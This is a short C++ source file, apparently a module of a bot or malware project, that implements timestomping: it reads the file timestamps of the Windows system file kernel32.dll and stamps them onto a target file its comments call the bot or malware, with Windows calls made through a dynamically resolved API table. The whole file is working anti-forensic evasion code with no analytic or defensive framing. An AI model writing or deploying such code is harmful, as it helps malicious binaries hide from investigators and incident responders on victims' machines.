#include "Evasion/timestomp.h"
#include "Core/api_resolve.h"

bool timestomp(const wchar_t *targetPath){
    API_TABLE& API = GetAPI();
    HANDLE hVictim, hMalware;
    FILETIME ftCreate, ftAccess, ftWrite;
    wchar_t kernel32Path[MAX_PATH];

    //find kernel32.dll path
    API.GetSystemDirectoryW(kernel32Path, MAX_PATH);
    wcscat(kernel32Path, L"\\kernel32.dll");

    //read filetimes from kernel32
    hVictim = API.CreateFileW(kernel32Path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if(hVictim == INVALID_HANDLE_VALUE){
        return false;
    }
    if(!API.GetFileTime(hVictim, &ftCreate, &ftAccess, &ftWrite)){
        API.CloseHandle(hVictim);
        
        return false;
    }
    API.CloseHandle(hVictim);
    
    //open bot
    hMalware = API.CreateFileW(targetPath, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    if(hMalware == INVALID_HANDLE_VALUE) return false;
    
    //apply fake filetimes
    if(!API.SetFileTime(hMalware, &ftCreate, &ftAccess, &ftWrite)){
        API.CloseHandle(hMalware);

        return false;
    }

    API.CloseHandle(hMalware);

    return true;
}
